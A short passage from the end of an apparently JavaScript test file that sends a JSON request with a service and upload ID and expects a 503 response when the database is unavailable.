        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ serviceId: SERVICE_ID, uploadId: 'u-1' }),
      })
    );
    expect(dbMissing.status).toBe(503);
  });
});
